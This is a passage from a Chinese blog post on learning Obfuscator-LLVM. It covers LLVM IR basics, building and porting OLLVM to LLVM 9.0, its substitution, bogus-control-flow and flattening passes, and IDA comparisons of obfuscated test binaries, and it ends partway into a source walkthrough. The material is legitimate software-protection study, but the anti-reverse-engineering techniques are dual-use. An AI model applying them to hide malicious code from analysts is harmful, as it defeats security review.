href="https://blog.csdn.net/king_jie0210/article/details/81705540" target="_blank" rel="noopener">ollvm源码分析</a></p><p><a href="https://bbs.pediy.com/thread-255130.htm" target="_blank" rel="noopener">[原创]ollvm源码分析 - Pass之Flattening</a></p><p><a href="https://bbs.pediy.com/thread-255078.htm" target="_blank" rel="noopener">[原创]ollvm源码分析 - Pass之SplitBaiscBlocks</a></p><p><a href="https://zhuanlan.zhihu.com/p/27617441" target="_blank" rel="noopener">GoSSIP安全研究项目：孤挺花（Armariris） LLVM混淆框架</a></p><p><a href="https://mp.weixin.qq.com/s/rORMNBExWVyGvWMFvYTXPw" target="_blank" rel="noopener">为OLLVM添加字符串混淆功能</a></p><p><a href="http://www.nagain.com/activity/article/14/" target="_blank" rel="noopener">llvm之旅第四站 － 编写Pass</a></p><p><a href="https://github.com/haidragon/study_obscure" target="_blank" rel="noopener">Github-haidragon / study_obscure</a></p><p><a href="https://bbs.pediy.com/thread-225681.htm" target="_blank" rel="noopener">[原创]Fllvm（Fuck-ollvm）介绍</a></p></blockquote><h2 id="啥是LLVM？"><a href="#啥是LLVM？" class="headerlink" title="啥是LLVM？"></a>啥是LLVM？</h2><blockquote><p><a href="https://bbs.pediy.com/thread-247981.htm" target="_blank" rel="noopener">[原创]LLVM了解篇剧场版</a></p></blockquote><p>以上这篇文章简要地介绍了LLVM</p><p>LLVM：Low Level Virtual Machine(最初)</p><p>官方定义：<strong>LLVM是一个模块化和可重用的编译器和工具链技术的集合</strong></p><p>LLVM最初是在2000年由伊利诺伊大学香槟分校(UUIC)的学生Chris Lattner及其硕士顾问Vikram Adve创建的研究项目，并在2003年发布第一个正式版本，目的是提供一种基于SSA的现代编译策略，这种策略能够支持任何编程语言的静态和动态编译。</p><p>有意思的是，他的作者原本想要写一个低层虚拟机的，然而他并没有被当成虚拟机来用，逐渐地偏离了他原本的方向。现在llvm不是任何单词的缩写，而是一种体系，包含了一系列的项目</p><p>对于LLVM核心（LLVM Core）来说，它是一个编译器基础设施框架，它包含了为我们编写编译器一系列的库（如程序分析、代码优化、机器代码生成等），并且提供了调用这些库的相关工具，如llvm-opt可以调用LLVM优化相关的库，llvm-mc可以调用LLVM机器代码生成相关的库。并为此提供了一个非常方便简单、具备类型的、平台无关的统一中间代码语言，称之为LLVM IR.</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ollvm-learning/3.png" alt></p><p>以上是一个正常编译器的流程，源代码经过前端编译成中间代码，在经过优化和后端生成相应的机器码，即可执行文件</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ollvm-learning/2.png" alt></p><p>LLVM编译一个源文件的过程：预处理 -&gt; 词法分析 -&gt; Token -&gt; 语法分析 -&gt; AST -&gt; 代码生成 -&gt; LLVM IR -&gt; 优化 -&gt; 生成汇编代码 -&gt; Link -&gt; 目标文件</p><blockquote><p>其中IR(intermediate representation)是前端语言生成的中间代码表示，也是Pass操作的对象，它主要包含四个部分：</p><p>（1）Module：比如一个.c或者.cpp文件。</p><p>（2）Function：代表文件中的一个函数。</p><p>（3）BasicBlock：每个函数会被划分为一些block，它的划分标准是：一个block只有一个入口和一个出口。</p><p>（4）Instruction：具体的指令。</p><p>IR中各部分的具体关系如下图：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ollvm-learning/IR-relation.png" alt></p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="ollvm-learning/4.png" alt></p><p>拿个例子来说就是：首先，我们有C代码程序文件，然后经过了Clang前端（或者古老的llvm-gcc前端，这是在Clang出现以前使用的前端，可以产生LLVM IR），然后会产生LLVM IR。在这里，我们可以发现LLVM IR是以.bc结尾，缩写代表的单词是bitcode，它是序列化的数据，用以存储在磁盘中。而LLVM IR非常牛逼的创建了三种LLVM IR表示格式，除了bitcode这种用以存储的格式，第二种是用于人类可读的的格式，一般以.ll结尾。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ clang a.c -S -emit-llvm<span class="comment"># 生成.ll可读文件</span></span><br></pre></td></tr></table></figure><p>这条命令即可产生<code>.ll</code>文件</p><p>而第三种格式则是内存表示格式，这一般是用于我们程序开发，去操作LLVM IR。那么这里面有一个宏观的概念，那就是一个编译单元（即一个.c文件），在LLVM IR中代表着一个Module，而一个Module里面含有Global Value，主要包括Global Variable 和 Function，而至于Global Alias大家接触比较少，我们暂时忽略。而一个Function里面包含着Basic Block，而一个 Basic Block里面包含着指令，如add。那么关系你可以认为是Module -&gt; Function -&gt; Basic Block -&gt; Instructions. 这是一个宏观的认识，需要具备。而这一个也就是我们常常去查阅的相关LLVM IR的API，如：<a href="http://llvm.org/docs/doxygen/html/classllvm_1_1GlobalValue.html" target="_blank" rel="noopener">llvm-GlobeValue</a></p><p>而这里明确的一点是，这三者是完全等价的，并且可以转换的</p><p>再回到上面的流程图，即产生<code>.bc</code>的阶段。产生完毕后，它这里直接进入<code>llvm-link</code>阶段，其实不太完整。若是我们使用了O2等优化，我们在这里还会经历一个优化的阶段，即对这一个编译单元的优化，大约包括了40多种优化Pass，如死代码消除，内联等。而经过优化后，依然是.bc文件，然后再进入llvm-link阶段。而在llvm-link阶段，所要做的其实就是把多个.bc文件合并成一个.bc文件，并且做链接时优化，在这篇文章中提到过一个例子：<a href="http://llvm.org/docs/LinkTimeOptimization.html" target="_blank" rel="noopener">LLVM Link Time Optimization</a>，可以查阅一下是如何进行链接时优化的。</p><p>而经过<code>llvm-link</code>阶段后，我们得到了一个新的<code>.bc</code>文件，那么我们会再次进入优化阶段，重新再进行一次优化。因为经过<code>llvm-link</code>后，我们的IR结构可能发生了一些变化，从而可能更有利于我们优化，得到更优化的IR。而这一步骤后，可以得到最终优化后的.bc，正式进入代码生成阶段。</p><p>而在这一幅图中，只列举出来了一个llc，即走机器代码生成的路径。其实对于LLVM来说，还可以有一个过程，那就是lli，即解释执行LLVM IR。不过我们这里不多谈，我们重点在机器代码生成。那么llc的作用就是把LLVM IR 编译成汇编文件<code>.s</code>，这里你可以把LLVM IR想象成一个编程语言，然后经过了llc编译器，最后产生了汇编文件。如同C程序，经过Clang，产生了LLVM IR一般。那么，产生了汇编文件以后，就可以调用系统的汇编器，如GNU的as，从而产生目标文件object file，即<code>.o</code>文件了。而细心的童鞋可能注意到了这里还有一条路径是<code>llvm-mc</code>，直接走生成object file的过程。而这条路径在如今来说，并不是每个平台都会走，核心在于LLVM本身的集成汇编器，即<code>-fintegrated-as</code>，使用集成汇编器既可以使用MCLoweing到MCInst，再使用MCStreamers直接到<code>.o</code>，当然也可以到<code>.s</code>。而目前本身的集成汇编器，我认为是并非完美，但是以发展趋势来看，会大一统的，从而做到没有平台差异，这也是LLVM做集成汇编器的一大理由。而生成完.o文件，剩下的过程就很简单了，就是链接器链接相关的库，然后和目标文件一起生存可执行文件<code>.out / .exe</code>了。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 二进制代码形式</span></span><br><span class="line">$ clang -emit-llvm -c main.c -o main.bc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可读文本代码形式</span></span><br><span class="line">$ clang -emit-llvm –S -c main.c -o main.ll</span><br></pre></td></tr></table></figure><ul><li><h4 id="llvm-和-clang-的关系"><a href="#llvm-和-clang-的关系" class="headerlink" title="llvm 和 clang 的关系"></a>llvm 和 clang 的关系</h4></li></ul><p><img src="https://magic-king.net/images/loading.gif" data-original="ollvm-learning/1.png" alt></p><p>对于 LLVM 来说，其前端是 clang，在编译源码文件的时候使用的编译工具也是 clang。<br>而生成中间 IR 代码后，llvm需要对 IR 代码进行一些操作，例如添加一些代码混淆功能。LLVM 的做法是通过编写 Pass(其实就是对应的一个个模块，每个类实现不同的功能)来实现混淆的功<br>能。所以实现混淆，其实就是编写功能性的 Pass</p><h3 id="Obfuscator-LLVM"><a href="#Obfuscator-LLVM" class="headerlink" title="Obfuscator-LLVM"></a>Obfuscator-LLVM</h3><p>Obfuscator-LLVM是由瑞士伊夫尔东莱班的应用科学与艺术大学信息安全小组（HEIG-VD）于2010年6月发起的一个项目。</p><p>该项目的目的是提供<a href="http://www.llvm.org/" target="_blank" rel="noopener">LLVM</a>编译套件的开源分支，该套件能够通过<a href="http://en.wikipedia.org/wiki/Obfuscation_(software" target="_blank" rel="noopener">代码混淆</a>)和防篡改来提高软件安全性。由于我们目前大部分工作在<a href="http://en.wikipedia.org/wiki/Intermediate_language" target="_blank" rel="noopener">中间表示</a>（IR）级别，因此我们的工具与所有编程语言（C，C ++，Objective-C，Ada和Fortran）和目标平台（x86，x86-64，PowerPC，PowerPC-64）兼容。</p><p>LLVM当前支持的ARM，Thumb，SPARC，Alpha，CellSPU，MIPS，MSP430，SystemZ和XCore）。</p><p>Obfuscator-LLVM的目的主要是在编译时增强软件就对抗向工程和编译时修改（动态调试？）</p><h4 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h4><p>可以直接从github上下载源码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git</span><br><span class="line">$ mkdir build</span><br><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line"><span class="comment"># 如果不想跑测试用例加上-DLLVM_INCLUDE_TESTS=OFF </span></span><br><span class="line">$ cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/</span><br><span class="line">$ make -j7</span><br></pre></td></tr></table></figure><p>然而我在4核4G虚拟机里编译将近2h，还报错了tcl</p><p>我现在只想再来几根内存条 :(</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">error:virtual memory exhausted:Cannot allocate memory</span><br><span class="line">$ make -j7 &gt;&gt;40%</span><br><span class="line"></span><br><span class="line">$ make -j4 &gt;&gt;95%</span><br><span class="line"></span><br><span class="line">$ make -j2 &gt;&gt;100%</span><br></pre></td></tr></table></figure><h4 id="o-llvm手动打包"><a href="#o-llvm手动打包" class="headerlink" title="o-llvm手动打包"></a>o-llvm手动打包</h4><blockquote><p><a href="http://www.few.vu.nl/~lsc300/LLVM/doxygen/index.html" target="_blank" rel="noopener">http://www.few.vu.nl/~lsc300/LLVM/doxygen/index.html</a></p><p>API Document</p></blockquote><p>因为我下的ollvm9.0的<code>-fla</code>有bug，所以决定亲自打包一波，顺便再深入了解ollvm</p><p>由Diffinity将ollvm4.0和llvm4.0进行对比，发现了以下文件的不同，也就意味着我们将ollvm打包进最新的llvm也需要修改以下文件。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">./include/llvm/Transforms/Obfuscation/ <span class="comment"># obfuscation的头文件</span></span><br><span class="line">./include/llvm/Transforms/CryptoUtils.h <span class="comment"># obfuscation的头文件</span></span><br><span class="line">./lib/Transforms/IPO/LLVMBuild.txt</span><br><span class="line">./lib/Transforms/IPO/PassManagerBuilder.cpp <span class="comment"># Pass注册</span></span><br><span class="line">./lib/Transforms/Obfuscation/ <span class="comment"># obfuscation source code</span></span><br><span class="line">./lib/Transforms/CMakeLists.txt</span><br><span class="line">./lib/Transforms/LLVMBuild.txt</span><br><span class="line">./tools/clang <span class="comment"># 集成clang,要在gitignore里取消clang的注释</span></span><br><span class="line">./.gitignore</span><br><span class="line">./CMakeLists.txt</span><br><span class="line">./CODE_OWNERS.TXT</span><br><span class="line">./LICENSE.TXT</span><br></pre></td></tr></table></figure><p>从自己的github的obfuscator仓库中clone下来，注意一定要clone，直接下载downloadzip没有.git信息，虽然他真的很慢。</p><p>然后创建自己的llvm9.0分支</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@github.com:Magic-King/obfuscator.git</span><br><span class="line">Cloning into <span class="string">'obfuscator'</span>...</span><br><span class="line">remote: Enumerating objects: 86723, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 86723 (delta 0), reused 0 (delta 0), pack-reused 86723</span><br><span class="line">Receiving objects: 100% (86723/86723), 132.79 MiB | 35.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (15346/15346), <span class="keyword">done</span>.</span><br><span class="line">$ git  branch -a</span><br><span class="line">* master</span><br><span class="line">  remotes/origin/HEAD -&gt; origin/master</span><br><span class="line">  remotes/origin/clang-425.0.24</span><br><span class="line">  remotes/origin/llvm-3.3</span><br><span class="line">  remotes/origin/llvm-3.4</span><br><span class="line">  remotes/origin/llvm-3.5</span><br><span class="line">  remotes/origin/llvm-3.6.1</span><br><span class="line">  remotes/origin/llvm-4.0</span><br><span class="line">  remotes/origin/master</span><br><span class="line"></span><br><span class="line">$ git  branch -r</span><br><span class="line">  origin/HEAD -&gt; origin/master</span><br><span class="line">  origin/clang-425.0.24</span><br><span class="line">  origin/llvm-3.3</span><br><span class="line">  origin/llvm-3.4</span><br><span class="line">  origin/llvm-3.5</span><br><span class="line">  origin/llvm-3.6.1</span><br><span class="line">  origin/llvm-4.0</span><br><span class="line">  origin/master</span><br><span class="line"></span><br><span class="line">$ git remote add origin git@github.com:Magic-King/obfuscator.git</span><br><span class="line">fatal: remote origin already exists.</span><br><span class="line"></span><br><span class="line">$ git checkout -b llvm-9.0</span><br><span class="line">Switched to a new branch <span class="string">'llvm-9.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ git push origin llvm-9.0</span></span><br><span class="line"><span class="string">Total 0 (delta 0), reused 0 (delta 0)</span></span><br><span class="line"><span class="string">remote:</span></span><br><span class="line"><span class="string">remote: Create a pull request for '</span>llvm-9.0<span class="string">' on GitHub by visiting:</span></span><br><span class="line"><span class="string">remote:      https://github.com/Magic-King/obfuscator/pull/new/llvm-9.0</span></span><br><span class="line"><span class="string">remote:</span></span><br><span class="line"><span class="string">To github.com:Magic-King/obfuscator.git</span></span><br><span class="line"><span class="string"> * [new branch]          llvm-9.0 -&gt; llvm-9.0</span></span><br></pre></td></tr></table></figure><p>然后把最新的llvm9.0.1放入<code>obfuscator/</code>文件夹下，把clang放入 <code>obfuscator/tools/clang</code>里</p><p>然后将obfuscator-llvm4.0移植到obfuscate里，具体可以查看我的github的commit记录</p><p>网址如下：<a href="https://github.com/Magic-King/obfuscator/commits/llvm-9.0" target="_blank" rel="noopener">https://github.com/Magic-King/obfuscator/commits/llvm-9.0</a></p><p>但是，手动打包之后，<code>-fla</code>还是有问题，不过其他选项倒是没问题，应该是<code>-fla</code>和llvm-9.0不兼容的问题</p><h4 id="o-llvm的特点"><a href="#o-llvm的特点" class="headerlink" title="o-llvm的特点"></a>o-llvm的特点</h4><ul><li><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Instructions-Substitution" target="_blank" rel="noopener">nstructions Substitution</a> <code>-mllvm -sub</code>：指令替换</li><li><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Bogus-Control-Flow" target="_blank" rel="noopener">Bogus Control Flow</a> <code>-mllvm -bcf</code>：伪控制流</li><li><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Control-Flow-Flattening" target="_blank" rel="noopener">Control Flow Flattening</a> <code>-mllvm -fla</code>：激活控制流扁平化</li><li><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Functions-annotations" target="_blank" rel="noopener">Functions annotations</a>：可以针对一些特定函数进行混淆（选择性混淆）</li></ul><h5 id="nstructions-Substitution"><a href="#nstructions-Substitution" class="headerlink" title="nstructions Substitution"></a><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Instructions-Substitution" target="_blank" rel="noopener">nstructions Substitution</a></h5><p>这种混淆技术的目标仅在于用功能上等效但更复杂的指令序列代替标准的二进制运算符（如加，减或布尔运算符）。当几个等效的指令序列可用时，随机选择一个。</p><p>这种混淆非常简单，并且不会增加很多安全性，因为可以通过重新优化生成的代码轻松地将其删除。但是，如果伪随机数发生器使用不同的值作为种子，则指令替换会在生成的二进制文件中带来多样性。</p><p>当前，只有整数运算符可用，因为用浮点值替代运算符会带来舍入误差和不必要的数值误差。</p><p>可用的编译器选项：</p><ul><li><code>-mllvm -sub</code>：激活指令替换</li><li><code>-mllvm -sub_loop=3</code>：如果激活了通行证，则将其应用到功能上3次。默认值：1。</li></ul><p>wiki中提到了可替换的运算：add、sub、and、or、xor。</p><h5 id="Bogus-Control-Flow"><a href="#Bogus-Control-Flow" class="headerlink" title="Bogus Control Flow"></a><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Bogus-Control-Flow" target="_blank" rel="noopener">Bogus Control Flow</a></h5><p>该方法通过在当前基本块之前添加一个基本块来修改函数调用图。这个新的基本块包含一个不透明的谓词，然后有条件地跳转到原始的基本块。</p><p>原始的基本块也将被克隆并填充以随机选择的垃圾指令。</p><p>可用的编译器选项：</p><ul><li><code>-mllvm -bcf</code>：激活伪控制流程</li><li><code>-mllvm -bcf_loop=3</code>：如果激活了通行证，则将其应用到功能上3次。默认值：1</li><li><code>-mllvm -bcf_prob=40</code>：如果激活了通行证，则基本团块将以40％的概率被混淆。默认值：30</li></ul><h5 id="Control-Flow-Flattening"><a href="#Control-Flow-Flattening" class="headerlink" title="Control Flow Flattening"></a><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Control-Flow-Flattening" target="_blank" rel="noopener">Control Flow Flattening</a></h5><p>此过程的目的是完全弄平程序的控制流程图。简单来说就是拆分基本块并置于无限循环中，程序流程由switch控制</p><p>可用的编译器选项：</p><ul><li><code>-mllvm -fla</code>：激活控制流展平</li><li><code>-mllvm -split</code>：激活基本块分割。一起使用可改善展平性。</li><li><code>-mllvm -split_num=3</code>：如果激活了通行证，则在每个基本块上应用3次。默认值：1</li></ul><h5 id="Functions-annotations"><a href="#Functions-annotations" class="headerlink" title="Functions annotations"></a><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Functions-annotations" target="_blank" rel="noopener">Functions annotations</a></h5><p>注释使您可以按功能指定要应用（或不应用）混淆的功能</p><p>用法：只需向您的函数添加属性。</p><p>例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">foo</span><span class="params">()</span> __<span class="title">attribute</span><span class="params">((__annotate__((<span class="string">"fla"</span>))))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>您可以为每个功能添加使用一个或多个注释。如果要禁用功能的混淆，也可以使用“反向标志”（例如，如果要禁用功能的伪造控制流，请使用注释“ nobcf”）。</p><h4 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h4><p>我自己写了一个测试文件，然后用于clang和ollvm混淆的各种测试</p><p>源代码如下，关于混淆之后的执行文件和源文件打包在了<a href="./ollvm-learning/test.zip">here</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">4<span class="built_in">printf</span>(<span class="string">"Hello LLVM"</span>);</span><br><span class="line">4<span class="keyword">char</span> *a= <span class="string">"Hello fucking bug"</span>;</span><br><span class="line">4<span class="comment">//a = "Hello O-LLVM!I will fuck you!";</span></span><br><span class="line">4<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">4<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i&lt;=<span class="number">10</span>;i++)&#123;</span><br><span class="line">44sum += i;</span><br><span class="line">4&#125;</span><br><span class="line">4<span class="built_in">printf</span>(<span class="string">"%s\nthe answer of what i do is %d\n"</span>,a,sum);</span><br><span class="line">4<span class="built_in">printf</span>(<span class="string">"test finished!\n"</span>);</span><br><span class="line">4<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下是gcc编译的文件通过ida逆向所得的流程图</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ollvm-learning/test_gcc_ida.png" alt="test_gcc_ida"></p><p>以下是用clang9.0 编译test的流程图，可见大体的流程是和gcc相同的，不过通过ida的万能F5反编译出来的源码，clang版本的基本和源码差不多，gcc版本的循环的变量挺奇怪的，但是总体流程还是不变的</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ollvm-learning/test_clang_ida.png" alt="test_clang_ida"></p><p>下图是加了ollvm的bcf选项的反汇编结果，可见添加了许多虚假控制流，真正执行的循环是左半部分，他把for循环结束之后的该执行的语句放到了右半部分，在添加虚假控制流</p><p>看反汇编的代码，他把for循环放入了一个while循环里，然后用一个if控制是否结束原来的循环，加入结束，就用<code>goto</code>到达最后执行的语句里，这里又写了一个假的while，经我看下来，这个while也就执行一次，循环就退出了，果然混淆后想搞懂流程贼麻烦</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ollvm-learning/test_bcf_ida.png" alt="ollvm-bcf"></p><p>ollvm编译fla选项，由于适配llvm9.0的fla选项失败了，所以这边是引用-split选项得出来的反汇编结果，split也就是fla平坦化所选择的选项</p><p>对比原来的clang反汇编出来的结果是不是多了许多可供选择的路，正如wiki所说是用switch控制的</p><p>反汇编出来的代码嵌套了多层while循环，并加入if判断，低层应该就是用switch实现的，然后再某几个switch case加入break破坏循环达到控制流程的目的</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ollvm-learning/test_split_ida.png" alt="ollvm-fla"></p><p>这个是最简单的，和clang编译的版本对比，主要区别在于分块之后的左边的块，他把其指令进行了替换，具体咋替换看我后面的源码分析</p><p>不过可惜的是，这个代码替换对于ida来说好像不是什么大事情，利用万能的F5反汇编时，他成功把循环里的加法还原了，产生的代码和clang版本没混淆的一模一样</p><p>可能这需要和其他几个选项一起使用会比较好</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ollvm-learning/test_sub_ida.png" alt="ollvm-sub"></p><p>//TODO：字符串混淆</p><h3 id="o-llvm源码分析"><a href="#o-llvm源码分析" class="headerlink" title="o-llvm源码分析"></a>o-llvm源码分析</h3><p>通过我们手动将ollvm与llvm9.0打包的过程，我们可以非常清楚地了解了ollvm的源码结构</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./include/llvm/Transforms/Obfuscation/ <span class="comment"># obfuscation的头文件</span></span><br><span class="line">./include/llvm/Transforms/CryptoUtils.h <span class="comment"># obfuscation的加密工具类的头文件</span></span><br><span class="line">./lib/Transforms/IPO/LLVMBuild.txt <span class="comment"># pass模块编译的模块注册</span></span><br><span class="line">./lib/Transforms/IPO/PassManagerBuilder.cpp <span class="comment"># Pass注册</span></span><br><span class="line">./lib/Transforms/Obfuscation/ <span class="comment"># obfuscation source code</span></span><br><span class="line">./lib/Transforms/CMakeLists.txt <span class="comment"># 加入子目录</span></span><br><span class="line">./lib/Transforms/LLVMBuild.txt <span class="comment"># 加入LLVM编译子目录</span></span><br></pre></td></tr></table></figure><p>我们知道，ollvm就是通过编写llvm的pass来将其中间语言IR进行不同程度的混淆</p><h4 id="Bogus-Control-Flow-1"><a href="#Bogus-Control-Flow-1" class="headerlink" title="Bogus Control Flow"></a>Bogus Control Flow</h4><p><strong>Bogus Control Flow</strong>的功能是为函数增加新的虚假控制流和添加垃圾指令。</p><p>其中文件位于<code>./include/llvm/Transforms/Obfuscation/BogusControlFlow.cpp</code></p><p>其中的注释跟我们非常形象的演示了其的工作内容</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This file implements BogusControlFlow's pass, inserting bogus control flow.</span></span><br><span class="line"><span class="comment">// It adds bogus flow to a given basic block this way:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Before :</span></span><br><span class="line"><span class="comment">//               entry</span></span><br><span class="line"><span class="comment">//             |</span></span><br><span class="line"><span class="comment">//         ______v______</span></span><br><span class="line"><span class="comment">//       |   Original  |</span></span><br><span class="line"><span class="comment">//       |_____________|</span></span><br><span class="line"><span class="comment">//                    |</span></span><br><span class="line"><span class="comment">//                v</span></span><br><span class="line"><span class="comment">//             return</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// After :</span></span><br><span class="line"><span class="comment">//                entry</span></span><br><span class="line"><span class="comment">//                    |</span></span><br><span class="line"><span class="comment">//               ____v_____</span></span><br><span class="line"><span class="comment">//        |condition*| (false)</span></span><br><span class="line"><span class="comment">//             |__________|----+</span></span><br><span class="line"><span class="comment">//            (true)|          |</span></span><br><span class="line"><span class="comment">//                    |          |</span></span><br><span class="line"><span class="comment">//            ______v______    |</span></span><br><span class="line"><span class="comment">//         +--&gt;|   Original* |   |</span></span><br><span class="line"><span class="comment">//         |   |_____________| (true)</span></span><br><span class="line"><span class="comment">//         |   (false)|    !-----------&gt; return</span></span><br><span class="line"><span class="comment">//         |    ______v______    |</span></span><br><span class="line"><span class="comment">//         |   |   Altered   |&lt;--!</span></span><br><span class="line"><span class="comment">//         |   |_____________|</span></span><br><span class="line"><span class="comment">//         |__________|</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>他的Cpp文件先写好了Debug信息，再定义了以下为pass提供的选项常量</p><p>其中，我们最常见的 <code>cl::opt&lt;data_type&gt;</code>是用来传递llvm之间pass共享的参数，也就是我们在编译时所给的<code>-bcf_prob = 50</code>这个命令行编译参数可以传递到pass的核心所在</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ollvm-learning/SourceCode_bcf_1.png" alt></p><p><code>cl::opt</code>这个用法让我想起了c++中<code>std::cout</code>、<code>using namespace std</code>，经查询发现，这是一个类似于python的import的一个语法，namespace是为了和c的.h区分开来</p><blockquote><p>详细可见：</p><p><a href="https://www.cnblogs.com/MrYuan/p/4955956.html" target="_blank" rel="noopener">C++ Namespace 详解</a></p><p><a href="https://www.runoob.com/cplusplus/cpp-namespaces.html" target="_blank" rel="noopener">C++ 命名空间</a></p><p><a href="https://blog.csdn.net/fengbingchun/article/details/78575978" target="_blank" rel="noopener">C++/C++11中命名空间(namespace)的使用</a>：这里面有一段折磨人的代码，读懂了应该就懂了c++的namespace的作用域</p></blockquote><p>目前读下来，最常见的应该就是<code>namespace llvm</code>和 <code>namespace cl</code>了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BogusControlFlow</span> :</span> <span class="keyword">public</span> 